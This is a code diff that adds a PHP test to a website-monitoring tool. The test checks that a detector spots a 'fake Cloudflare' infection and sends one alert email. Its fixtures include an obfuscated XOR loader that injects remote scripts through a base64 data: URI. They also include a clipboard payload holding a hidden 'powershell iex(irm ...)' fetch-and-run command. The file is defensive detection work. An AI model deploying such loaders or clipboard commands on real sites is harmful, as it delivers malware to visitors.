@@ -461,6 +461,29 @@ class WebminderPanelTest extends TestCase
         $this->assertNull($this->sitio->refresh()->caida_desde); // no es una caída
     }
 
+    public function test_vigilar_avisa_una_vez_al_dia_del_falso_cloudflare_y_no_de_una_web_normal(): void
+    {
+        config(['services.avisos.email' => 'yo@ongoing.test', 'mail.from.address' => 'watch@ongoing.test']);
+        // Misma forma que el de bleyabogados.es (dominios cambiados): URLs cifradas por XOR y metido por LiteSpeed en un data: URI
+        $cargador = '(function(){var O=(function(n,s){n=atob(n);var o="",i=0;while(i<n.length){o+=String.fromCharCode(n.charCodeAt(i)^s.charCodeAt(i%s.length));i++}return o.split("|")})("AAAA","k"),n=0;'
+            . 'function c(){var s=document.createElement("script");s.src=O[n]+"/embed.js";s.onerror=function(){n++;c()};document.head.appendChild(s)}c()})()';
+        $normal = '<html><body><p>/wp-content/</p><script src="data:text/javascript;base64,' . base64_encode('var astra={"x":1};') . '"></script>'
+            . '<script>(function(w,d,s,l,i){var f=d.getElementsByTagName(s)[0],j=d.createElement(s);j.async=true;j.src="https://www.googletagmanager.com/gtm.js?id="+i;f.parentNode.insertBefore(j,f);})(window,document,"script","dataLayer","GTM-X");</script></body></html>';
+        $infectada = str_replace('</body>', '<script src="data:text/javascript;base64,' . base64_encode($cargador) . '"></script></body>', $normal);
+        $this->assertNull(CerrojoService::falsoCloudflare($normal));
+        $this->assertNull(CerrojoService::falsoCloudflare('<script>navigator.clipboard.writeText(location.href)</script>')); // botón «copiar enlace»
+        $this->assertNotNull(CerrojoService::falsoCloudflare('<script>navigator.clipboard.writeText("powershell -w h -c iex(irm https://x.test)")</script>'));
+        Http::fake(['acme.test/*' => Http::response($infectada)]);
+
+        $this->artisan('webminder:vigilar');
+        $this->artisan('webminder:vigilar');
+
+        $correos = $this->correos();
+        $this->assertCount(1, $correos);
+        $this->assertStringContainsString('falso Cloudflare', $correos[0]->getSubject());
+        $this->assertStringContainsString('direcciones cifradas (XOR)', $correos[0]->getTextBody());
+    }
+
     public function test_las_pantallas_del_panel_cargan(): void
     {
         Http::fake(['*' => Http::response(['success' => true, 'data' => [
